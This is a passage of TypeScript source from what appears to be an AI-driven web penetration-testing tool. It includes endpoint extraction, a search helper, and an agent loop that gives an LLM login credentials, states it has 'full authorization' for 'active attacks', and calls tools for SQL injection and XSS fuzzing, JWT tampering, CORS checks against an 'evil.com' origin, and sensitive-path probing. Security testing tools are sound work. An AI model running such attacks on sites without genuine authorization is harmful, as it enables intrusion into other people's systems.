        /url:\s*['"`](\/[^'"`\s\\]{1,100})['"`]/g,
      ];
      const found = new Set<string>();
      for (const pat of patterns) {
        let m: RegExpExecArray | null;
        while ((m = pat.exec(html)) !== null) {
          if (m[1]) found.add(m[1]);
        }
      }
      fromHtml = [...found].slice(0, 40);
    } catch { /* skip */ }

    const all = [...new Set([...fromNetwork, ...fromHtml])].slice(0, 60);
    return JSON.stringify({ endpoints: all, count: all.length });
  }

  async function webSearch(query: string): Promise<string> {
    // Try Firecrawl if available
    if (process.env["FIRECRAWL_API_KEY"]) {
      try {
        const { default: FirecrawlApp } = await import("@mendable/firecrawl-js") as { default: { new(opts: { apiKey: string }): { search(q: string, opts: { limit: number }): Promise<{ data?: Array<{ url: string; title: string; description: string }> }> } } };
        const fc = new FirecrawlApp({ apiKey: process.env["FIRECRAWL_API_KEY"]! });
        const res = await fc.search(query, { limit: 5 });
        return JSON.stringify((res.data ?? []).map((r) => ({ url: r.url, title: r.title, snippet: r.description })));
      } catch { /* fall through */ }
    }

    // Fallback: DuckDuckGo Instant Answer API
    try {
      const encoded = encodeURIComponent(query);
      const resp = await fetch(`https://api.duckduckgo.com/?q=${encoded}&format=json&no_html=1&skip_disambig=1`, {
        signal: AbortSignal.timeout(8000),
      });
      const data = await resp.json() as {
        AbstractText?: string;
        RelatedTopics?: Array<{ Text?: string; FirstURL?: string }>;
      };
      const results = [
        ...(data.AbstractText ? [{ snippet: data.AbstractText }] : []),
        ...(data.RelatedTopics ?? []).slice(0, 5).map((t) => ({ url: t.FirstURL, snippet: t.Text })),
      ];
      return JSON.stringify(results.length > 0 ? results : [{ note: "No results found — try a more specific query" }]);
    } catch (e) {
      return JSON.stringify({ error: String(e) });
    }
  }

  // ── Agent loop ──────────────────────────────────────────────────────────────

  const loginUrl = credentials.loginUrl ?? url;

  const userMessage = `TARGET URL: ${url}
LOGIN URL: ${loginUrl}
USERNAME: ${credentials.username}
PASSWORD: ${credentials.password}

You have full authorization to actively test this application for security vulnerabilities.
Run ALL phases: authentication → reconnaissance → active attacks.
Be thorough. Try every relevant attack category. Report only CONFIRMED findings with evidence.

Begin.`;

  let content: string;
  let tokensUsed: number;

  try {
    const result = await agentLoop(
      {
        system: SYSTEM,
        messages: [{ role: "user", content: userMessage }],
        tools: TOOLS,
        temperature: 0.05,
        maxTokens: 16000,
        maxIterations: 30,
      },
      async (toolName, args) => {
        logger.debug(`  [attack] ${toolName}(${JSON.stringify(args).slice(0, 120)})`);
        const a = args as Record<string, unknown>;

        switch (toolName) {
          case "navigate":             return navigate(String(a["url"] ?? ""));
          case "get_interactive_elements": return getInteractiveElements();
          case "fill":                 return fill(String(a["selector"] ?? ""), String(a["value"] ?? ""));
          case "click":                return click(String(a["selector"] ?? ""));
          case "get_page_html":        return getPageHtml();
          case "get_cookies":          return getCookies();
          case "find_links":           return findLinks();
          case "go_back":              return goBack();
          case "check_headers":        return checkHeaders(String(a["url"] ?? url));
          case "http_request":         return httpRequest(
            String(a["method"] ?? "GET"),
            String(a["url"] ?? ""),
            (a["headers"] as Record<string, string> | undefined) ?? {},
            a["body"] ? String(a["body"]) : undefined,
            Boolean(a["include_session"] ?? false),
          );
          case "fuzz_sqli":            return fuzzSqli(String(a["url"] ?? ""), String(a["param"] ?? ""));
          case "fuzz_form_sqli":       return fuzzFormSqli(String(a["field_selector"] ?? ""), String(a["submit_selector"] ?? ""));
          case "fuzz_xss":             return fuzzXss(String(a["url"] ?? ""), String(a["param"] ?? ""));
          case "tamper_jwt":           return tamperJwt(String(a["token"] ?? ""), String(a["operation"] ?? "decode_only"));
          case "check_cors":           return checkCors(String(a["url"] ?? url), String(a["origin"] ?? "https://evil.com"));
          case "check_rate_limit":     return checkRateLimit(String(a["url"] ?? url), String(a["method"] ?? "POST"), Number(a["count"] ?? 10));
          case "check_sensitive_paths": return checkSensitivePaths(String(a["base_url"] ?? baseOrigin));
          case "extract_api_endpoints": return extractApiEndpoints();
          case "web_search":           return webSearch(String(a["query"] ?? ""));
          case "wait":                 return wait(Number(a["ms"] ?? 1000));
          case "wait_for_selector":    return waitForSelector(String(a["selector"] ?? "body"));
          default:                     return JSON.stringify({ error: `Unknown tool: ${toolName}` });
        }
      }
    );
    content = result.content;
    tokensUsed = result.tokensUsed;
  } finally {
    await browser.close();
  }

  const findings = parseFindings(content, "blackbox");
  return { url, findings, tokensUsed, pagesVisited: [...new Set(pagesVisited)], attacksSummary };
}
